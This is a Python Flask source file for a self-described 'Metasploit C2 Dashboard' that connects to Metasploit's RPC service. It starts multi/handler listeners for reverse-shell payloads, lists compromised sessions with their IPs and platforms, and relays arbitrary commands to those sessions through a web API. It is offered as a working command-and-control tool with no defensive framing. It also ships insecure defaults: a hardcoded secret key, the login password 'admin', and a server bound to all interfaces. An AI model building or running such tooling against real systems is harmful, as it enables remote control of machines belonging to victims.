#!/usr/bin/env python3
"""
Metasploit C2 Dashboard - Minimal Working Version
"""
from flask import Flask, render_template, request, jsonify, session, redirect
from pymetasploit3.msfrpc import MsfRpcClient
import hashlib
import threading
import time

app = Flask(__name__)
app.secret_key = 'c2_secret_key'

# Configuration
MSF_PASSWORD = 'msf_password'
LOGIN_PASSWORD = 'admin'  # كلمة مرور بسيطة
LOGIN_HASH = hashlib.sha256(LOGIN_PASSWORD.encode()).hexdigest()

# Global state
class State:
    def __init__(self):
        self.msf = None
        self.handler_running = False
        self.handler_config = {'host': '', 'port': '', 'payload': ''}
        self.sessions = {}
    
    def connect(self):
        if self.msf:
            return True
        try:
            self.msf = MsfRpcClient(MSF_PASSWORD, server='127.0.0.1', port=55553, ssl=False)
            return True
        except:
            try:
                self.msf = MsfRpcClient(MSF_PASSWORD, server='127.0.0.1', port=55553, ssl=True)
                return True
            except:
                return False
    
    def start_handler(self, host, port, payload):
        if not self.connect():
            return False, "Cannot connect to MSF"
        try:
            exploit = self.msf.modules.use('exploit', 'multi/handler')
            exploit['LHOST'] = host
            exploit['LPORT'] = int(port)
            exploit['PAYLOAD'] = payload
            exploit.execute()
            self.handler_running = True
            self.handler_config = {'host': host, 'port': port, 'payload': payload}
            return True, "Handler started"
        except Exception as e:
            return False, str(e)
    
    def stop_handler(self):
        self.handler_running = False
        return True, "Handler stopped"
    
    def get_sessions(self):
        if not self.msf:
            return []
        try:
            sessions_dict = self.msf.sessions.list
            result = []
            for sid, info in sessions_dict.items():
                result.append({
                    'id': sid,
                    'ip': info.get('session_host', 'Unknown'),
                    'platform': info.get('platform', 'Unknown'),
                    'type': info.get('type', 'Unknown')
                })
            return result
        except:
            return []
    
    def execute_command(self, session_id, command):
        if not self.msf:
            return "Not connected"
        try:
            shell = self.msf.sessions.session(session_id)
            shell.write(command + '\n')
            time.sleep(1)
            output = shell.read()
            return output if output else "Command executed"
        except Exception as e:
            return f"Error: {str(e)}"

state = State()

# Routes
@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect('/login')
    return render_template('dashboard.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    
    data = request.get_json()
    pwd = data.get('password', '')
    pwd_hash = hashlib.sha256(pwd.encode()).hexdigest()
    
    if pwd_hash == LOGIN_HASH:
        session['logged_in'] = True
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/api/handler/start', methods=['POST'])
def start_handler():
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'})
    
    data = request.get_json()
    success, msg = state.start_handler(
        data['host'],
        data['port'],
        data['payload']
    )
    return jsonify({'success': success, 'message': msg})

@app.route('/api/handler/stop', methods=['POST'])
def stop_handler():
    if not session.get('logged_in'):
        return jsonify({'success': False})
    
    success, msg = state.stop_handler()
    return jsonify({'success': success, 'message': msg})

@app.route('/api/handler/status', methods=['GET'])
def handler_status():
    if not session.get('logged_in'):
        return jsonify({'running': False})
    
    return jsonify({
        'running': state.handler_running,
        'config': state.handler_config
    })

@app.route('/api/sessions', methods=['GET'])
def get_sessions():
    if not session.get('logged_in'):
        return jsonify({'sessions': []})
    
    sessions = state.get_sessions()
    return jsonify({'sessions': sessions})

@app.route('/api/execute', methods=['POST'])
def execute():
    if not session.get('logged_in'):
        return jsonify({'success': False})
    
    data = request.get_json()
    output = state.execute_command(data['session_id'], data['command'])
    return jsonify({'success': True, 'output': output})

if __name__ == '__main__':
    print("\n" + "="*50)
    print("C2 Dashboard Started")
    print("="*50)
    print(f"URL: http://localhost:5000")
    print(f"Password: {LOGIN_PASSWORD}")
    print("\nMake sure msfrpcd is running:")
    print("  msfrpcd -P msf_password -a 127.0.0.1\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)
